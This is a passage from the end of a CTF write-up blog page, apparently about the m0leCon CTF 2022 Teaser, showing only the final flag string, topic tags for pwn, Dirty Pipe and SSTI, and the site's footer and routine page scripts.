</code></pre><p><strong>FLAG:</strong> <code>ptm{d1d_u_f1nd_th3_r1ckr0ll?}</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bootplug.io/tags/ctf/>ctf</a></li><li><a href=https://bootplug.io/tags/pwn/>pwn</a></li><li><a href=https://bootplug.io/tags/dirty-pipe/>dirty pipe</a></li><li><a href=https://bootplug.io/tags/ssti/>ssti</a></li></ul><nav class=paginav><a class=next href=https://bootplug.io/posts/ctf/equinorctf/><span class=title>Next Page »</span><br><span>Equinor CTF 2021</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share m0leCon CTF 2022 Teaser on twitter" href="https://twitter.com/intent/tweet/?text=m0leCon%20CTF%202022%20Teaser&url=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fm0leconctf_2022%2f&hashtags=ctf%2cpwn%2cdirtypipe%2cssti"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share m0leCon CTF 2022 Teaser on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fm0leconctf_2022%2f&title=m0leCon%20CTF%202022%20Teaser&summary=m0leCon%20CTF%202022%20Teaser&source=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fm0leconctf_2022%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share m0leCon CTF 2022 Teaser on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fm0leconctf_2022%2f&title=m0leCon%20CTF%202022%20Teaser"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share m0leCon CTF 2022 Teaser on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fm0leconctf_2022%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share m0leCon CTF 2022 Teaser on whatsapp" href="https://api.whatsapp.com/send?text=m0leCon%20CTF%202022%20Teaser%20-%20https%3a%2f%2fbootplug.io%2fposts%2fctf%2fm0leconctf_2022%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share m0leCon CTF 2022 Teaser on telegram" href="https://telegram.me/share/url?text=m0leCon%20CTF%202022%20Teaser&url=https%3a%2f%2fbootplug.io%2fposts%2fctf%2fm0leconctf_2022%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://bootplug.io/>Blog | bootplug</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>